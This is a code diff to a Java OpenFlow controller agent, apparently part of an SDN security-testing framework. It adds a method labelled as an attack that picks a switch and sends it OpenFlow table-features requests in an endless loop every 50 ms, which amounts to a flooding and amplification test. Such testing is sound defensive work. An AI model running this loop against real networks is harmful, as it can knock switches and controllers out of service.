@@ -45,6 +45,7 @@ import org.osgi.service.component.ComponentInstance;
 import org.projectfloodlight.openflow.protocol.*;
 import org.projectfloodlight.openflow.protocol.action.OFAction;
 import org.projectfloodlight.openflow.protocol.action.OFActionOutput;
+import org.projectfloodlight.openflow.protocol.instruction.OFInstruction;
 import org.slf4j.Logger;
 
 import java.io.BufferedReader;
@@ -697,6 +698,7 @@ public class AppAgent {
         return result;
     }
 
+    // 3.1.240
     public String testInfiniteFlowRuleSynchronization() {
         System.out.println("[ATTACK] Infinite Flow Rule Synchronization");
         isInconsistency = "nothing";
@@ -732,6 +734,36 @@ public class AppAgent {
         }
 
         return isInconsistency;
+    }
+
+    // 3.1.250
+    public String testTableFeaturesReplyAmplification() throws Exception {
+        System.out.println("[ATTACK] Table Features Request Amplification Attack");
+        log.info("[ATTACK] Table Features Request Amplification Attack");
+        Device device = deviceService.getAvailableDevices().iterator().next();
+        log.info("Target Device: " + device.id().toString());
+        OFFactory factory = OFFactories.getFactory(OFVersion.OF_13);
+
+//        List<OFInstruction> insts = Lists.newLinkedList();
+//        insts.add()
+//
+//        factory.buildFlowAdd()
+//                .setMatch(factory.matchWildcardAll())
+//                .setInstructions()
+
+        OFTableFeaturesStatsRequest request = factory.buildTableFeaturesStatsRequest()
+                .setXid(777)
+                .build();
+//        OFFactory factory = OFFactories.getFactory(OFVersion.OF_13);
+//        OFCalientFlowStatsRequest request = factory.buildCalientFlowStatsRequest()
+//                .setMatch(factory.matchWildcardAll())
+//                .setXid(777)
+//                .build();
+
+        while(true) {
+            controller.write(Dpid.dpid(device.id().uri()), request);
+            Thread.sleep(50);
+        }
     }
 
     /**
